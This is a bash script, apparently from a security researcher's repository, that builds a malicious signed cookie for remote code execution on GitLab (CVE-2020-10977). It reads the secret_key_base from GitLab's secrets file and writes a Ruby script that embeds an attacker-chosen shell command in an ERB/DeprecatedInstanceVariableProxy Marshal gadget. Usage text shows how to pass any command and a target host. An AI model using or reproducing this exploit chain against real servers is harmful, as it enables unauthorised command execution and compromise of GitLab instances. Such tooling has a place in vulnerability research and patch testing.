#!/bin/bash
source ./color_print_fun.sh



function get_secret_key_base(){
	cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml | grep secret_key_base|awk -F':' '{print $2}'
}

# get_secret_key_base

# function cookie_serializer_generater(){

# }

function GitlabRails_Input_Controller(){

if [ ! -s "./color_print_fun.sh" ]; then
	printf "\033[4;31m\033[01m\n[ERROR] Run blew command to define print function.\n$ wget https://raw.githubusercontent.com/Bin4xin/B4xinSynchronize/master/bash/functions/color_print_fun.sh\n\033[0m"
	exit
else
	# - running scripts in a gitlab environment. 
	# - step 1. run git-lab rails console to generate cookie.
		# - 1.1 check gitlab-rails exist or not.
		# - 1.2 check ruby environment. (maybe in gitlab EE/CE environment, there are no environment trouble.)
	which gitlab-rails
	if [[ $? == 0 ]]; then
		# statements
		echo "ok."
	else
		# statements
		underline_critical_show "\n[ERROR] Sorry, PLZ install gitlab-rails then run this again.\n\nvisit https://bin4xin.sentrylab.cn/about/GitLab-CVE-2020-10977-RCE/"
		exit
	fi
fi
# step 2 touch a ruby script file prapare for generate cookie.
# $ gitlab-rails runner /tmp/cookie.rb -> puts "hello,world" -> hello,world

cat >/tmp/GitlabRails_Input_Controller.rb<<EOF
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= \`$cmd\` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
EOF


}

cmd="$1"
read_msg=$(echo -e "\033[32m[INFO] Are you sure?(y/n): \033[0m")
warn_msg=$(echo -e "\033[33m[WARN] PLZ type in (y/n): \033[0m")
whereAmI=$(pwd)

# if [ "$cmd" != 'help' ] && [ "$cmd" != '--help' ] && [ "$cmd" = '' ]; then
#   underline_critical_show "[CRITICAL] ERROR INPUT! \nType in parameter error \nUsage: bash $0 [ config|dw|sw ]"
#   exit
# fi


if [[ $# -ne 0 ]]; then
	case "$1" in
		help|--help|-h)
			common_show "Bash scripts to generate cookies out of gitlab-rails console. (RCE due to CVE-2020-10977 <local file read>)\nvisit https://hackerone.com/reports/827052\n
USAGE: bash $0 command vuln_gitlab_url\nSUCH AS: bash $0 \"touch /tmp/success\" 8.8.8.8\n
[help|--help|-h]: \t%-s \t print help message. 打印帮助信息\n
[\$command]: \t%-s \t command you want to execute. 要执行的命令\n
[\$url]: \t%-s \t gitlab vuln url (unnecessary). gitlab地址，非必要\n"
		;;
		cmd|--cmd|-c)
			# common_show "JUMP TO CMD"
			GitlabRails_Input_Controller
		;;
	esac
else
	exit 1
fi

#GitlabRails_Input_Controller
#cat /tmp/GitlabRails_Input_Controller.rb

